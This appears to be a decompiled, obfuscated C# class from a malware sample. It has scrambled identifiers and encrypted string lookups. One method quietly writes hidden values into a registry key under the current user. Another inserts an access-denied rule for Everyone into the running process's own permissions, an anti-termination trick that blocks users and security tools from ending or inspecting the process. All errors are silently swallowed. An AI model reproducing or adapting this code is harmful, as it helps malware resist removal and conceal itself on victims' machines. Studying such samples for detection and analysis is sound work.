using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nVxbvhuaKzC;

internal sealed class IuTSWrvWgWQjhKXa
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr OjPNmCIfoX, int QXnqfwxgJbRo, [Out] byte[] GBNHNFNJWaYED, uint bgpgaMbJZjsz, out uint BgwYkvBEWCBIJn);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr mDQoEnlSbuIc, int WkGPqmGsQfyNkI, [In] byte[] EtUWRhJRNdK);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void xlcMfXwCEmZ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(FcnBvlzKWyQDwH.EvKBdYIakj(FcnBvlzKWyQDwH.PbjDJjWZgFBdj(getString_0(107411149))));
			registryKey.SetValue(FcnBvlzKWyQDwH.EvKBdYIakj(getString_0(107411012)), getString_0(107413705));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor lcxddSTRmhcGx(IntPtr intptr_0)
	{
		byte[] gBNHNFNJWaYED = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, gBNHNFNJWaYED, 0u, out var BgwYkvBEWCBIJn);
		if ((long)BgwYkvBEWCBIJn > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, gBNHNFNJWaYED = new byte[BgwYkvBEWCBIJn], BgwYkvBEWCBIJn, out BgwYkvBEWCBIJn))
		{
			return null;
		}
		return new RawSecurityDescriptor(gBNHNFNJWaYED, 0);
	}

	private void RSSzbkqVjueE(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void NQiQaABzEuWeZV()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = lcxddSTRmhcGx(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			RSSzbkqVjueE(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static IuTSWrvWgWQjhKXa()
	{
		Strings.CreateGetStringDelegate(typeof(IuTSWrvWgWQjhKXa));
	}
}
